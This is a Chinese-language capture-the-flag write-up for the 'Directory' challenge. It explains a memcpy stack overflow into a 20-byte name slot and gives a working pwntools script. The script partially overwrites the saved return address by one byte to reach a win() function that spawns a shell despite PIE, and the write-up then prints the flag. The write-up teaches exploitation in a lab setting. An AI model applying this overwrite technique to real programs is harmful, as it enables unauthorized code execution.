# Directory

## 题目简述

程序维护 `char names[10][20]`。每次姓名先读入临时缓冲区，实际读取长度最多 48 字节，然后用该长度 `memcpy` 到一个仅 20 字节的姓名槽。第十个槽位紧邻栈帧末端，可用最后一次添加覆盖返回地址。

## 解题过程

先添加九个短姓名，使 `name_count=9`。第十次写入从 `names[9]` 开始；虽然目录总槽数检查仍合法，`memcpy` 却不会限制到 20 字节。调试确认从第十槽开头到保存返回地址低字节的偏移为 40：

```python
def add_name(data):
    p.sendlineafter(b"> ", b"1")
    p.sendafter(b"name: ", data)

for _ in range(9):
    add_name(b"A")

add_name(b"c" * 40 + b"8")
p.sendlineafter(b"> ", b"4")
```

二进制启用 PIE，但同一映像内 `process_menu` 返回点与 `win` 处在同一页，高地址字节相同。只把保存 RIP 的最低字节改为 `0x38`，即可把返回目标重定向到 `win()`，避免泄露完整 PIE 基址。`win()` 执行 `system("/bin/sh")`，最终读取：

```text
byuctf{yeeee3e3e3_p4rt14l_0v3rwr1t3!!}
```

## 方法总结

数组元素数量检查不能替代元素长度检查。部分覆盖利用 ASLR 的页内偏移不变性：当目标和原返回地址共享其余地址字节时，只改低字节就足以稳定跳转，且无需先制造地址泄露。
